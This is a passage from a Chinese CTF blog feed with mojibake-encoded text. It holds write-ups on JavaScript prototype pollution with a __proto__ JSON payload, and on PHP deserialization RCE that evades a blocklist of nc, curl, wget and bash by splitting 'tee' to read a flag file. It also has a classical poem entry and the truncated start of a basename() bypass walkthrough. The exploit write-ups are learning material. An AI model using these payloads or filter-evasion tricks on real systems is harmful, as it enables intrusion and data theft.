class="hljs-comment">//JSON.parseçš„å­˜åœ¨å¯ä»¥å°†JSONå­—ç¬¦ä¸²è§£æä¸ºJavaScriptå¯¹è±¡ï¼Œè¿™æ ·ä¸€æ¥å°±å­˜åœ¨o2.__protp__.b=2,å¹¶æŠŠè¿™ä¸œè¥¿èµ‹å€¼ç»™ä¹‹å‰ä¸å­˜åœ¨çš„o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éšä¾¿æ·»ç‚¹æ•°æ®ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼š</p><p><code>submit</code>è¿™ä¸œè¥¿å°±æ˜¯æäº¤æ•°æ®ï¼Œ<code>info/æ—¶é—´æˆ³</code>å°±æ˜¯åŠ è½½åº•ä¸‹é‚£äº›æ„¿æœ›æ ‡ç­¾(çœ‹<code>info.js</code>ä¹Ÿèƒ½çŸ¥é“)</p><p><img src="/img/otengirl3.png" alt="otengirl3"></p><p><img src="/img/otengirl6.png" alt="otengirl6"></p><p>ç°åœ¨æœ‰ç‚¹æ€è·¯äº†ï¼šæ ¹æ®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br><br>timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“è¿™ä¸ª<code>timestamp</code>ä¼šå–<code>timestamp, minTimestamp</code>ä¹‹é—´çš„æœ€å¤§å€¼(ä¿è¯æ—¶é—´æ˜¯åœ¨ç”µå½±å‘å¸ƒä¹‹å)ï¼Œ<code>minTimestamp</code>çš„è¯é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„Dateå¯¹è±¡ã€‚å®ƒé¦–å…ˆå°è¯•ä»<code>CONFIG.min_public_time</code>ä¸­è·å–æœ€å°å…¬å…±æ—¶é—´ï¼Œå¦‚æœ<code>CONFIG.min_public_time</code>ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨<code>DEFAULT_CONFIG.min_public_time</code>çš„å€¼ã€‚</p><p>æˆ‘ä»¬å»é…ç½®æ–‡ä»¶ä¸­æ‰¾æ‰¾è¿™ä¸ªæ—¶é—´æ˜¯å¤šå°‘ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br><span class="hljs-comment">//config.default.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>config.js</code>ä¸­å¹¶ä¸å­˜åœ¨<code>min_public_time</code>(ä½†<code>config.default.js</code>ä¸­å­˜åœ¨ï¼Œæ‰€ä»¥åé¢å–å¾—å€¼æ˜¯<code>config.default.js</code>ä¸­çš„ã€‚)é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“<code>config.js</code>ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­åŠ å…¥æˆ‘ä»¬æƒ³è¦çš„<code>min_public_time</code>ï¼Œç„¶åç³»ç»Ÿå°±ä¼šå¿½ç•¥<code>config.default.js</code>ï¼Œè®©æ—¶é—´è¶³å¤Ÿæ—©ã€‚</p><p>é‚£ä¹ˆå“ªé‡Œè°ƒç”¨äº†<code>merge</code>å‡½æ•°å‘¢ï¼Ÿ<code>const result = await insert2db(merge(DEFAULT, data));</code></p><p>ç®€å•è¯´ä¸‹æ±¡æŸ“åŸç†ï¼š<code>merge(DEFAULT, data)</code>ä¼šæ£€æŸ¥<code>DEFAULT, data</code>é‡Œé¢çš„é”®ï¼Œå¦‚æœæŸä¸ªé”®ä»–ä¿©éƒ½æœ‰ï¼Œé‚£å°±é€’å½’è°ƒç”¨<code>merge</code>å‡½æ•°ã€‚å¦‚æœå­˜åœ¨æŸä¸ªé”®ä»–ä¿©ä¸åŒæ—¶æ‹¥æœ‰ï¼Œå°±ä»¤<code>DEFAULT[key] = data[key]</code>ã€‚</p><p>å¦‚æœ<code>data</code>å¯¹è±¡çš„åŸå‹é“¾ä¸Šå­˜åœ¨åä¸º<code>min_public_time</code>çš„å±æ€§ï¼Œåˆ™è¯¥å±æ€§å°†è¢«èµ‹å€¼ç»™<code>DEFAULT</code>å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>DEFAULT[key]</code>å°†ä¼šæŒ‡å‘åŸå‹é“¾ä¸Šçš„å€¼ã€‚åœ¨JavaScriptä¸­ï¼Œå¯¹è±¡å¯ä»¥å…·æœ‰ç‰¹æ®Šçš„å±æ€§__proto__ï¼Œå®ƒæŒ‡å‘å¯¹è±¡çš„åŸå‹ã€‚é€šè¿‡ä¿®æ”¹<code>data[&#39;__proto__&#39;</code>][â€˜min_public_timeâ€™]çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å½±å“åŸå‹é“¾ä¸Šçš„å±æ€§:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">payload<span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;place&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;contact&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1700797610124</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1970-01-01&quot;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/otengirl7.png" alt="otengirl7"></p><p>ç„¶ååˆ·æ–°ä¸€ä¸‹ï¼Œä¼šæŠ“åˆ°<code>info</code>çš„åŒ…ï¼š</p><p><img src="/img/otengirl8.png" alt="otengirl8"></p><p>æ ¹æ®å‰é¢çš„ä»£ç æˆ‘ä»¬çŸ¥é“<code>info</code>åé¢è·Ÿçš„æ•°å­—å°±æ˜¯<code>ts</code>ï¼Œå°±æ˜¯é‚£ä¸ª<code>min_time</code>åå†è¿‡å¤šå°‘ç§’(è¿˜æ˜¯æ¯«ç§’æ¥ç€ï¼Œå¿˜äº†)ã€‚åˆšè®¾ç½®äº†<code>1970-01-01</code>ï¼Œåé¢éšä¾¿æ”¹ä¸ªå°ç‚¹çš„æ•°å­—å°±è¡Œ:</p><p><img src="/img/otengirl9.png" alt="otengirl9"></p><p>æ‹¿åˆ°<code>flag</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><code>minipop</code>ç±»ä¸‹å­˜åœ¨ä¸¤ä¸ªå…¬æœ‰å±æ€§<code>$code</code>å’Œ<code>qwejaskdjnlka</code>ä»¥åŠ<code> __toString()</code>æ–¹æ³•å’Œ<code>__destruct()</code>ï¼Œ<code>__destruct()</code>è¿™ä¸œè¥¿å¯¹è±¡é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(åºåˆ—åŒ–ä¼šè°ƒç”¨ååºåˆ—åŒ–ä¹Ÿä¼šè°ƒç”¨)ã€‚<code>__toString()</code>è¿™ä¸œè¥¿å°±æ˜¯ä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶ä¼šè¢«è°ƒç”¨ã€‚</p><p>æ€è·¯å°±æ˜¯é€šè¿‡<code>__destruct()</code>è°ƒç”¨<code>__toString()</code>ã€‚</p><p>è¿˜æœ‰å°±æ˜¯è™½ç„¶<code>waf</code>è¿‡æ»¤äº†æŒºå¤šï¼Œä¸è¿‡å¯ä»¥åˆ©ç”¨æ‹¼æ¥çš„ç‰¹æ€§<code>æ¯”å¦‚è¿‡æ»¤äº†lså¯ä»¥åˆ©ç”¨l&#39;&#39;sæ¥ä»£æ›¿</code></p><p><code>exec</code>å‡½æ•°æœ¬èº«ä¸ä¼šå°†å‘½ä»¤çš„ç»“æœç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚å®ƒå°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚<code>eval</code>ä¼šæ›´å¸¸è§</p><p>è¿™é¢˜ä¸ä¼šåšã€‚ã€‚å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<code>https://blog.csdn.net/m0_63138919/article/details/133958661</code></p><p>ä¸»è¦å°±æ˜¯åˆ©ç”¨<code>tee</code>è¿™ä¸ªå‘½ä»¤ï¼š</p><p><img src="/img/tee3.png" alt="tee3"></p><p>åç¼€åŠ ä¸åŠ æ— æ‰€è°“ï¼Œ<code>Linux</code>ä¸‹æ–‡ä»¶åå¯ä»¥ä½¿ä»»ä½•æœ‰æ•ˆçš„å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//é€šè¿‡echoï¼Œè¿™æ—¶$bè¿™ä¸ªç±»çš„å®ä¾‹è¢«å½“æˆå­—ç¬¦ä¸²äº†</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;ls / | t&#x27;&#x27;ee viper&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>å›æ˜¾<code>alright</code>åç›´æ¥è®¿é—®<code>viper</code>å°±è¡Œï¼š</p><p><img src="/img/tee1.png" alt="tee1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span> -&gt; qwejaskdjnlka = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//é€šè¿‡echoï¼Œè¿™æ—¶$bè¿™ä¸ªç±»çš„å®ä¾‹è¢«å½“æˆå­—ç¬¦ä¸²äº†</span><br><span class="hljs-variable">$b</span> -&gt; code = <span class="hljs-string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:35:&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee viper3&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tee2.png" alt="tee2"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜</title>
    <link href="/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/"/>
    <url>/2023/11/22/2023-11-22-%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E5%8D%97%E6%B5%B7%E5%BD%92%E8%B5%A0%E7%8E%8B%E5%AE%9A%E5%9B%BD%E4%BE%8D%E4%BA%BA%E5%AF%93%E5%A8%98/</url>
    
    <content type="html"><![CDATA[<p>â€‹      </p><span id="more"></span><hr><h2 id="å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜"><a href="#å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜" class="headerlink" title="å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜"></a>å®šé£æ³¢Â·å—æµ·å½’èµ ç‹å®šå›½ä¾äººå¯“å¨˜</h2><p>[å®‹] è‹è½¼</p><p>å¸¸ç¾¡äººé—´ç¢ç‰éƒã€‚å¤©åº”ä¹ä¸ç‚¹é…¥å¨˜ã€‚å°½é“æ¸…æ­Œä¼ çš“é½¿ã€‚é£èµ·ã€‚é›ªé£ç‚æµ·å˜æ¸…å‡‰ã€‚<br>ä¸‡é‡Œå½’æ¥é¢œæ„ˆå°‘ã€‚å¾®ç¬‘ã€‚ç¬‘æ—¶çŠ¹å¸¦å²­æ¢…é¦™ã€‚è¯•é—®å²­å—åº”ä¸å¥½ã€‚å´é“ã€‚æ­¤å¿ƒå®‰å¤„æ˜¯å¾ä¹¡</p>]]></content>
    
    
    
    <tags>
      
      <tag>é˜…è¯»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_4</title>
    <link href="/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/"/>
    <url>/2023/11/14/2023-11-14-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_4/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//è¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶åã€‚</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basenameç”¨æ¥è·å–æ–‡ä»¶åéƒ¨åˆ†</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">64</span>));<span class="hljs-comment">//ç”Ÿæˆä¸€ä¸ª64å­—èŠ‚ï¼ˆå³512ä½ï¼‰çš„éšæœºå¯†é’¥ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hash_equals</span>(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<span class="hljs-comment">//å“ˆå¸Œå€¼ç›¸ç­‰</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å…¶å®å¾ˆå¥½ç†è§£ã€‚ä¸€å¼€å§‹ä»¥ä¸º<code>hash_equals</code>å­˜åœ¨ç»•è¿‡ã€‚ã€‚åæ¥æ‰çŸ¥é“è€ƒçš„æ˜¯<code>basename</code>ç»•è¿‡ï¼š</p><p>å…ˆäº†è§£ä¸€ä¸‹<code>$_SERVER[&#39;PHP_SELF&#39;]</code>è¿™ä¸œè¥¿å¹²å•¥ç”¨çš„<code>(å‚è€ƒhttps://www.shawroot.cc/937.htmlå’Œhttps://www.cnblogs.com/Article-kelp/p/16045800.html)</code></p><p>$_SERVER[â€˜PHP_SELFâ€™]ï¼šç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„è·¯å¾„åŠ PHP ç¨‹åºåç§°ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ç½‘å€ï¼šhttps:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><br><span class="hljs-variable">$_SERVER</span>[â€˜PHP_SELFâ€™] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[â€˜SCRIPT_NAMEâ€™] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<br><span class="hljs-variable">$_SERVER</span>[â€˜REQUEST_URIâ€™] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br>basename()å‡½æ•°å°±æ˜¯è·å–è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹å°±æ˜¯è¿™ä¸ª<code>basename</code>ï¼Œæ ¹æ®è¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<span class="hljs-comment">//basenameç”¨æ¥è·å–æ–‡ä»¶åéƒ¨åˆ†</span><br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚æœä»¤<code>basename($_SERVER[&#39;PHP_SELF&#39;])æ˜¯config.php</code>å°±èƒ½æ‹¿åˆ°<code>flag</code>ã€‚æˆ‘ä»¬å¯ä»¥æ„é€ <code>URL:http://7a610bd9-e609-454a-a18c-d1e340cfde4a.node4.buuoj.cn:81/index.php/config.php?source=1(æ³¨æ„è¿™ä¸ªindex.phpï¼Œæœ€å¼€å§‹æˆ‘æ²¡åŠ )</code>:</p><p><img src="/img/canyouguess1.png" alt="canyouguess1"></p><p>å†çœ‹ä¸Šé¢é‚£æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//è¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶åã€‚</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆå»æ‰æ­£åˆ™åŒ¹é…ä¸­çš„è½¬ä¹‰ç¬¦å·ä¼šå¥½ç†è§£ä¸€äº›ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config.php/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<span class="hljs-comment">//è¶…å…¨å±€å˜é‡ï¼Œå®ƒåŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶çš„æ–‡ä»¶åã€‚</span><br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it 